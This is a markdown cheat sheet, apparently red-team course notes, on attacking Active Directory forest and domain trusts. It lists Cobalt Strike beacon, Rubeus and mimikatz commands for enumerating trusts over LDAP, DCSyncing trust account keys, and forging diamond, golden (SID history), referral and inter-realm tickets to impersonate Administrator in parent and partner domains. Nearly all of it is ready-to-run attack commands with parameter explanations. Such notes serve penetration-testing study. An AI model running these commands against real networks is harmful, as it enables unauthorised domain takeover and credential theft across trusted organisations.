# Forest & Domain Trusts

## Trust Account

```shell
beacon> ldapsearch (samAccountType=805306370) --attributes samAccountName
```

```txt
0 is TRUST_DIRECTION_DISABLED.
1 is TRUST_DIRECTION_INBOUND.
2 is TRUST_DIRECTION_OUTBOUND.
3 is TRUST_DIRECTION_BIDIRECTIONAL.
```


## Parent/Child Trusts

```shell
# Find trusted domain
beacon> ldapsearch (objectClass=trustedDomain)

# Get other domain's SID
beacon> ldapsearch (objectClass=domain) --attributes objectSid --hostname $PARENT_DC --dn DC=$DOMAIN,DC=com

# Create Diamond ticket and pwn it (OPSEC Safe IMO)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /sids:S-1-5-21-3926355307-1661546229-813047887-512 /krbkey: /nowrap

# Create golden ticket with EXTRA SIDS and pwn it

# /aes256 is the AES hash of the child domain's krbtgt account.
# /user is the user you want to impersonate.
# /domain is the child domain.
# /sid is the SID of the child domain.
# /sids is a list of SIDs you want in the ticket's SID history.
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256: /user:Administrator /domain: /sid: sids:S-1-5-21-3926355307-1661546229-813047887-519 /nowrap
```

## One-Way Inbound Trusts

- Golden tickets with SID history do not work in these cases because external trusts employ something called SID filtering.  The trusting domain will therefore ignore any SIDs that are not native to itself.

```shell
# Adversary's can enumerate foreignSecurityPrincipal container
# of the trusting domain across the inbound trust.
beacon> ldapsearch (objectClass=foreignSecurityPrincipal) --attributes cn,memberOf --hostname partner.com --dn DC=partner,DC=com
```

> The container contains 4 default values that we're not really interested in: S-1-5-4, S-1-5-9, S-1-5-11, and S-1-5-17.  Anything other than these values are of interest to us.

```shell
beacon> ldapsearch (objectSid=$OBJECT_SID)
ldapsearch (samAccountType=805306369) --attributes samAccountName --dn DC=partner,DC=com --hostname partner.com
```

- Forging referral ticket

```shell
beacon> dcsync contoso.com CONTOSO\$TRUSTACCOUNT$

# /user is the username to impersonate.
# /domain is the FQDN of the trusted domain.
# /sid is the SID of the trusted domain. 
# /id is the RID of the impersonated user.
# /groups are the RIDs of the impersonated user's domain groups.  Domain Users is 513, Workstation Admins is 1106, and Partner Jump Users is 6102.
# /service is the krbtgt service of the trusting domain.
# /rc4 is the inter-realm key.
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /user: /domain:CONTOSO.COM /sid: /id:115 /groups: /service:krbtgt/partner.com /rc4: /nowrap

# /service is the target service in the trusting domain.
# /dc is a domain controller in the trusting domain.
# /ticket is the inter-realm TGT.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/par-jmp-1.partner.com /dc:par-dc-1.partner.com /ticket:doIFM[...snip...]mNvbQ== /nowrap
```

## One-Way Outbound Trusts

```shell
# Find trusted domain's GUID
beacon> ldapsearch (objectClass=trustedDomain) --attributes name,objectGUID
# Get the trusted account hash which is also the inter-realm key
beacon> mimikatz lsadump::dcsync /domain:partner.com /guid:{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}
# Forge ticket
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:PARTNER$ /domain:CONTOSO.COM /dc:lon-dc-1.contoso.com /rc4:6150491cceb080dffeaaec5e60d8f58d /nowrap
```